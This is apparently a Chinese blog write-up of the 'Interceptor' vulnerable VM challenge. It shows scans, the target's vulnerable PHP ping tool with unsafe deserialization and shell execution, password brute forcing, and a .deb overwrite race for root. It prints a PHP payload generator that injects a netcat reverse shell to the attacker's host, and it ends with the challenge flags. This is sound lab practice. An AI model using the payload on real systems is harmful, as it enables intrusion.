---
title: VulnVM Interceptor靶机复盘
author: LingMj
data: 2025-03-22
categories: [VulnVM]
tags: [upload]
description: 难度-Hard
---

## 网段扫描
```
root@LingMj:~# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.71	a0:78:17:62:e5:0a	Apple, Inc.
192.168.137.137	3e:21:9c:12:bd:a3	(Unknown: locally administered)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.055 seconds (124.57 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:~# nmap -p- -sV -sC 192.168.137.137 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 07:58 EDT
Nmap scan report for debian.mshome.net (192.168.137.137)
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.27 seconds
```

## 获取webshell
![picture 1](../assets/images/20ba12d572bfab13ffe93aafe277558828a7f1a329120b32fee80f3fd24c55fb.png)  

![picture 0](../assets/images/dae513eaf7412fc9bfbd7c9ccef9457dfe49c81ec87ed028bf7939a22e8dcbf2.png)  
![picture 2](../assets/images/f846b6200313e09e630fad8533b8915d5117aa6b14e7bddaf3d8fa6602f8ca69.png)  

```
<?php
session_start();

$valid_username = "";
$valid_password = "";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['logged_in'] = true;
    } else {
        $login_error = "Invalid credentials.";
    }
}


if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}


if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                text-align: center;
                padding: 20px;
            }
            .login-box {
                width: 300px;
                background: white;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
                margin: 100px auto;
            }
            .login-box h2 {
                margin-top: 0;
                font-size: 18px;
                color: #333;
            }
            .input-field {
                width: 100%;
                padding: 8px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 3px;
            }
            .login-btn {
                width: 100%;
                padding: 8px;
                background: #007bff;
                color: white;
                border: none;
                cursor: pointer;
                border-radius: 3px;
            }
            .login-btn:hover {
                background: #0056b3;
            }
            .error {
                color: red;
                font-size: 14px;
            }
        </style>
    </head>
    <body>

        <div class="login-box">
            <h2>Login</h2>
            <form method="POST">
                <input type="text" name="username" class="input-field" placeholder="Username" required>
                <input type="password" name="password" class="input-field" placeholder="Password" required>
                <button type="submit" name="login" class="login-btn">Login</button>
            </form>
            <?php if (isset($login_error)) echo "<p class='error'>$login_error</p>"; ?>
        </div>

    </body>
    </html>

    <?php
    exit;
}


class pingTest {
    public $ipAddress = "127.0.0.1";
    public $isValid = False;
    public $output = "";

    function validate() {
        if (!$this->isValid) {
            if (filter_var($this->ipAddress, FILTER_VALIDATE_IP) || strpos($this->ipAddress, ";") !== false) {
                $this->isValid = True;
            }
        }
        $this->ping();
    }

    public function ping() {
        if ($this->isValid) {
            $this->output = shell_exec("ping -c 3 $this->ipAddress");    
        }
    }
}

if (isset($_POST['session_data'])) {
    $pingTest = @unserialize(urldecode($_POST['session_data']));

    if ($pingTest !== false && is_object($pingTest)) {
        $pingTest->validate();
    } else {
        die("Deserialization error.");
    }
} else {
    $pingTest = new pingTest;
    $pingTest->validate();
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Diagnostic Tool</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 20px;
        }
        .ping-box {
            width: 60%;
            max-width: 600px;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            margin: 20px auto;
            text-align: left;
        }
        .ping-box h2 {
            margin-top: 0;
            font-size: 18px;
            color: #333;
        }
        .output {
            background: black;
            color: limegreen;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            height: 150px;
            overflow-y: auto;
            border-radius: 3px;
            border: 1px solid #333;
        }
        .form-container {
            margin-bottom: 20px;
        }
        .ping-input {
            padding: 8px;
            width: 60%;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .ping-btn {
            padding: 8px 15px;
            background: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 3px;
        }
        .ping-btn:hover {
            background: #0056b3;
        }
        .logout-btn {
            margin-top: 20px;
            display: inline-block;
            padding: 8px 15px;
            background: red;
            color: white;
            text-decoration: none;
            border-radius: 3px;
        }
        .logout-btn:hover {
            background: darkred;
        }
    </style>
</head>
<body>

    <div class="ping-box">
        <h2>Ping Utility</h2>
        <div class="form-container">
            <form method="POST">
                <input type="text" name="session_data" class="ping-input" placeholder="Enter IP Address">
                <button type="submit" class="ping-btn">Ping</button>
            </form>
        </div>
        <h3>Ping Results:</h3>
        <div class="output">
            <?php echo nl2br(htmlspecialchars($pingTest->output)); ?>
        </div>
    </div>

    <a href="?logout=true" class="logout-btn">Logout</a>

</body>
</html>
```

>wordpress信息还没用，这个压缩包应该是webshell用的
>

![picture 3](../assets/images/dfd1f5270771db4996fd3484cec8b3602e27c18ded1bd16398aab19ec5ec83f8.png)  
![picture 4](../assets/images/8ce77a66391937deaf5c442730e66070b23bbf266734de35c8615c030dba6ada.png)  
![picture 5](../assets/images/393eabf7bfc0bc894f1e7620dece5cd8ab8027623ec4a9d0319f30f0efb25cf9.png)  

>好像有插件漏洞，可以利用
>

![picture 6](../assets/images/f5a7f9875b3dedf8d99a517b07ee2e1309b2f7027648b9f611a5368d71aea027.png)  

>看一下相关介绍：https://github.com/WordPress/twentytwentyfive
>

![picture 7](../assets/images/5bde3111d11c82b7ff1d1eeb2beddecf866d5bf9ff39fdd5dd0045b66d7ca962.png)  

>至少版本啥的是一样的，目前没见cve，看看密码爆得怎么样了，确实我直接搜索没有exploit，是否存在插件漏洞就难了
>

![picture 8](../assets/images/cd889f271e0f57ead3c9927e7f85659cc38e6413b45af9124dac450133811b94.png)  

>像是文件包含
>

![picture 9](../assets/images/abe69efdae61495c6d97c11f25bb7b087f5f4da73f2422f3e7372b9bd005def0.png)  

>找了一下这个东西没发现在那，要目录全爆破么
>

![picture 10](../assets/images/4b3fb70ae6ba44a1029a3226dc197308a7117e0dc623d206dedb30565c7d5309.png)  
![picture 11](../assets/images/56ea2826ffa4680ed1f116fac031fa7423824b5d38d9011ce64c17ec81d93779.png)  

>无sql，开始陷入一段迷茫期了,爆破一手ftp
>

![picture 12](../assets/images/1d785819951c60aae6024d20e3cce116e0689c3640a8b0840bfbb1a98db7554c.png)  
![picture 13](../assets/images/4b825d3f8e3ddce14830e9c0fbaf9e40621bbe65a705913c31c0874f2bd2e269.png)  

>这个好像是hello某个cmd靶机吧，很多东西都是相似的
>

![picture 14](../assets/images/2a3f25a0c92524deed534fb7c40ac30695c94db1aa266f44e77f69a2d87e0a1d.png)  
![picture 15](../assets/images/dca13fa60d0558e9124667e6984775a4b8581583b6f63ee45f6cc8600bfed243.png)  

>有一个新目录了可以利用一下
>

![picture 16](../assets/images/0a065d6f444764b6b99e6ee36eb41f611ab995ddf937fa7a643e897382270719.png)  

>可以访问，就看看是啥了，记得前面有一个backup的zip应该跟这个无关看看cve
>

![picture 17](../assets/images/24c7aabbe36010b18e2f99ced661a15ef053860ff7bc3a017f0dbc69e90674fc.png)  

>没有，ftp也没有，是php看看是否有注入获取利用其他点
>

![picture 18](../assets/images/2f3abf9ef45db47388ff8bdf93c2da0707b02396485f3319d05ecc4d5dba656d.png)  
![picture 19](../assets/images/ce54b33eb446cbc9bad5dcd09027b18bf5736704aee36081a222d6adfee14bc6.png)  

> 有账户密码了
>

![picture 20](../assets/images/4261c579329ed30b3c508c4e4ff23f05d8f01c66e5e2ea5e69d0b1f07687f7a2.png)  

>目前能爆破的是ftp，wordpress
>

![picture 21](../assets/images/dd98dff07628f10e059aefec5350ba896e4e30a1a68707af1c3eee4c31a654c5.png)  

>跑出一个新东西，可以试着看一下
>

![picture 22](../assets/images/d5c94151c26f68d2025cd44beed5092400cb0f7227ece81979a320cbd9219a46.png)  

>还是一个登录，不过呢跟之前那个zip好像有点像，试跑一下账户密码
>

![picture 23](../assets/images/2b7d6b77e5e4f33a0e7c2d15e9fb2408293e38e172a7fe977483043e8dd1674c.png)  

>不得不提一下社区版的brutesuite是真慢啊跑密码，跑了ftp和wpscan无果
>

![picture 24](../assets/images/f596a194e7d2749a2feedd90f569290421dade8ba4d9c7d273fa77836d0d70f1.png)  
![picture 25](../assets/images/8a9594ce4cdbd507f5aa8715f763ffeae8b2a47c42e4ec2f5b00fab2f0952279.png)  

>只能等bp了，10分钟400都没跑完受不了了启动hydra方案
>

![picture 26](../assets/images/dfeb152f8d17d3d7e1e303bcbe6ba16626c96bc6f79054d5e027c39bf5ab3310.png)  

![picture 27](../assets/images/7bfb8ee8a5e98dff9914e933d0ad010d14f44c4e84f0b1525322c2388482f05b.png)  

>我hydra都出来了，bp没300
>

![picture 28](../assets/images/e8d24796e7332b9543305ca37c88137199efe64d53cc78f0bce53f63c05977ba.png)  
![picture 29](../assets/images/ec6a3b83ccba5b795e6e2fff2eef1628bc9ec68e392d465a950c8f978d934129.png)  

>他会对这个ping -c 127.0.0.1命令进行php 反序列化运行，自己写一个就好了，当然gtp也可以生成
>

![picture 30](../assets/images/12761e111a811a00e8114bf1752ba7ab0e5ac164ca7532a25b05eebd18ef5da5.png)  

>貌似以前打过ctf不是怎么构造的
>

```
<?php
class pingTest {
    public $ipAddress = "127.0.0.1;busybox nc 192.168.137.190 1234 -e /bin/bash";
    public $isValid = True;
    public $output = "";
}

// 生成恶意序列化数据
$payload = new pingTest();
$serializedPayload = serialize($payload);

// URL编码后的攻击payload
$urlEncodedPayload = urlencode($serializedPayload);
echo "恶意序列化数据：\n" . $serializedPayload . "\n\n";
echo "URL编码后的攻击载荷：\n" . $urlEncodedPayload;
?>
```

![picture 31](../assets/images/39659faf8ca38810cb787b230dde44193d28e5ed29de123c4223a9acf3ec6eff.png)  
![picture 32](../assets/images/e33722891931cf79b50eddbc8265fc934e2b8e547da452a04bff6df59380d79a.png)  


## 提权

>看一下config文件
>

![picture 33](../assets/images/3fd3731cac91e8eb348031a1284672abb24ebd0d440abb40dac9bffe8e140c19.png)  
![picture 34](../assets/images/6da9869cf18ac75b6fd882432d15a10a1a40e5d1f0fc3d4125c711350a38dbc5.png)  

>好像没啥意外啊
>

![picture 35](../assets/images/a1ea338fd674dc9ec0c8d8bbf901429673ad07e1e05240e06df88a7c0a58b170.png)  
![picture 36](../assets/images/4232c90f05a7a9871dc5d811369bd232931202c54c3c0c0fd304952656d03095.png)  

>我以为同一密码呢
>

![picture 37](../assets/images/b57ea89ff9c7290eac41309aef3c80b27838cb7359b141f9e0eed1e759d09602.png)  
![picture 38](../assets/images/eafef6b8eb8e6b0e1256a203404b46e7c263b488a75e5e5edd2f67ff76a8e4fe.png)  

>这个新奇没见过，先爆破ftp一手
>
![picture 39](../assets/images/ab641f23a6431fabfcf2845b0f8bcddf0c915b1a6735fe6b119460c12fba3b0a.png)  

![picture 40](../assets/images/75b91c405bd5ed6ca58b5d0b8966bea705a65981e71a73e793ea9a68661bbfe6.png)  

>奇怪很奇怪
>

![picture 41](../assets/images/b6f6e32fcae76c61288c8ae80663a6d54c00d166cbee08f361ae155427c6c2da.png)  
![picture 42](../assets/images/fb0ed4262e18b7cf26ead0564b85fa062b731594f130c7cbd1206d6877eff521.png)  
![picture 43](../assets/images/e81a664f40c32a94d38a4461f8f0e7f52f3ca38be27326745b87efbf339421db.png)  

>忘了火狐那个东西了
>

![picture 44](../assets/images/5e3d78bfc2059609ad511b9461d0bdf28b0b79364ce00b6d2e8f219ca18a57f3.png)  
![picture 45](../assets/images/d9687930e50f60373ac403aea7959f5ea70afcd8ccfec8d599ecc07013661a9d.png)  
![picture 46](../assets/images/1a668a41a4caa28e8a74806c72ac537cd8fde2d7a1deafe7ea0a045a9e397136.png)  
![picture 47](../assets/images/135a314be109a40c86a7036299311ba5ff463cf324cd3597c26654955ecf760e.png)  
![picture 48](../assets/images/3d95782866ceae31755c1827b2fb3c08e5a8ab875da1d366d94979dfcf3dd1a1.png)  

![picture 49](../assets/images/6bc09f4046fe5964fcac988007dd6edaedb97b62262e3bf5273dc43e2897c7ee.png)  

>看看是否能执行命令了
>

![picture 50](../assets/images/3e32c5fc5bbb7a0a4fcc6e3e5db63813de9f2e1aca8975a813e5cf2ab9dd5a24.png)  
![picture 51](../assets/images/1f7d1b63c153a13f167051615935491f598ece85413bd0b335a6b547620b457f.png)  

>这里只需要把文件中东西替换就行，试了半天install方案，发现他是个普通脚本
>

![picture 52](../assets/images/fd075ca86d807f6aab4cf044b7833a34c33b8d891944ed5f5ff50a13e392f0ae.png)  
![picture 53](../assets/images/c8220ef190efc60e6e5cd8e66f373ebf3aa2c7ca33368eb9adbfc4da8db072e3.png)  
![picture 54](../assets/images/6350dcecf20474341036d841c15661832b346c11c47caa97c9ca19d288beee61.png)  

>可以看到程序是不断的wget -O进行操作，只要我们里面的deb是我们自己就能让它命令执行，所以我们开个不断覆盖deb的程序和它抢着覆盖大概率就能成功了
>

![picture 55](../assets/images/9f690d1431dffb0eafd19d74c95ac86b9f57167c4605360bbc69d86bdc891fe7.png)  
![picture 56](../assets/images/24682f09097049a2cabca46d0812b4f7bee377a250a48054b3857e19458c852b.png)  

>卡主了看来要等一伙
>

![picture 57](../assets/images/1fc516bceebb2b5dbdce93d04da04d2e1382995415b8cef17d5c12993da5795f.png)  

>成功了，还挺有意思的靶机
>

![picture 58](../assets/images/10a56120c9be62af21eed631423f97e3ae88cad120633121dd5e2a736263e188.png)  

>结束
>


>userflag:afaf21d904389bf90902b93fac941c14
>
>rootflag:4ae681e15cd9bf51a9a846ab9e2b5f33
>